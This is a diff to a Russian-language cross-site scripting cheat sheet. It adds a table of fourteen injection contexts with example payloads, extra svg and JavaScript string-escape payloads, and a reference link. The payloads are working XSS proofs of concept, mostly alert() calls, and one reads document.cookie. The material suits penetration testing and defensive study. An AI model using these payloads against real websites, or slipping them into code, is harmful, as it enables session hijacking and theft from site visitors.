@@ -3,7 +3,6 @@
 > Межсайтовый скриптинг (XSS) — это тип уязвимости компьютерной безопасности, обычно встречающийся в веб-приложениях. XSS позволяет злоумышленникам внедрять вредоносный код на веб-сайт, который затем выполняется в браузере любого, кто посещает этот сайт. Это может позволить злоумышленникам украсть конфиденциальную информацию, такую как учётные данные пользователя, или выполнять другие вредоносные действия.
 
 ## Содержание
-## Содержание
 
 - [Методология](#Методология)
 - [Proof of Concept (PoC)](#Proof-of-Concept-PoC)
@@ -177,19 +176,28 @@ document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue
 
 # Контексты межсайтового скриптинга (XSS)
 
-
-
-
-
-
-
-
-
+| № | Контекст | Техника | Пример эксплойта | Краткое описание |
+|---|---|---|---|---|
+| 1 | Между HTML-тегами | Скрипт-тег | `<script>alert(document.domain)</script>` | Классическое внедрение скрипта |
+| 2 | Между HTML-тегами | Изображение с onerror | `<img src=1 onerror=alert(1)>` | Срабатывает при ошибке загрузки изображения |
+| 3 | В атрибуте тега | Закрытие кавычки и тега | `"><script>alert(document.domain)</script>` | Завершаем значение атрибута, закрываем тег, внедряем новый |
+| 4 | В атрибуте тега | Обработчик события + autofocus | `" autofocus onfocus=alert(document.domain) x="` | Добавляем обработчик, autofocus для автоматического срабатывания |
+| 5 | В атрибуте href | Псевдопротокол javascript: | `<a href="javascript:alert(document.domain)">` | Выполнение JS через ссылку |
+| 6 | В атрибуте тега (канонический тег) | Access key | `<link rel="canonical" accesskey="X" onclick="alert(1)">` | Вызов через сочетание клавиш (Ctrl+Shift+X) |
+| 7 | В JavaScript (внутри скрипта) | Закрытие script-тега | `</script><img src=1 onerror=alert(document.domain)>` | Закрываем текущий скрипт, внедряем свой HTML |
+| 8 | В строке JavaScript | Выход через кавычки | `';alert(document.domain)//` | Закрываем строку кавычкой, выполняем код, комментируем остаток |
+| 9 | В строке JavaScript | Выход через дефис | `'-alert(document.domain)-'` | Альтернативный способ закрытия строки |
+| 10 | В строке JavaScript | Обход экранирования обратного слеша | `\\';alert(document.domain)//` | Нейтрализуем добавленный приложением обратный слеш |
+| 11 | В JavaScript (ограничение символов) | Без круглых скобок (throw) | `onerror=alert;throw 1` | Вызов функции через глобальный обработчик исключений |
+| 12 | В обработчике события (onclick) | HTML-сущность вместо кавычек | `&apos;-alert(document.domain)-&apos;` | Браузер декодирует &apos; как ' при обработке атрибута |
+| 13 | В шаблонном литерале | Встраивание выражения | `${alert(document.domain)}` | Вставка выражения в шаблонный литерал через ${...} |
+| 14 | Клиентская шаблонизация (AngularJS) | Внедрение шаблонного выражения | `{{constructor.constructor('alert(1)')()}}` | Использование синтаксиса шаблонизатора для выполнения кода |
 
 
 # XSS в HTML/приложениях
 
 ## Распространённые полезные нагрузки
+
 **Кастом:**
 ```javascript
 location='/site/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x'
@@ -223,6 +231,7 @@ location='/site/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x'
 **Полезные нагрузки с тегом `<svg>`:**
 
 ```javascript
+"><svg><animatetransform onbegin=alert(1)
 <svgonload=alert(1)>
 <svg/onload=alert('XSS')>
 <svg onload=alert(1)//
@@ -322,6 +331,9 @@ location='/site/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x'
 ```javascript
 -(confirm)(document.domain)//
 ; alert(1);//
+" autofocus onfocus=alert(document.domain) x="
+'-alert(document.domain)-'
+';alert(document.domain)//
 ```
 
 ---
@@ -659,6 +671,7 @@ ruby -run -ehttpd . -p8080
 - [XSS Payloads List](http://www.xss-payloads.com/payloads-list.html)
 - [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 - [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+- [XSS in hidden fields](https://portswigger.net/research/xss-in-hidden-input-fields)
 
 
 
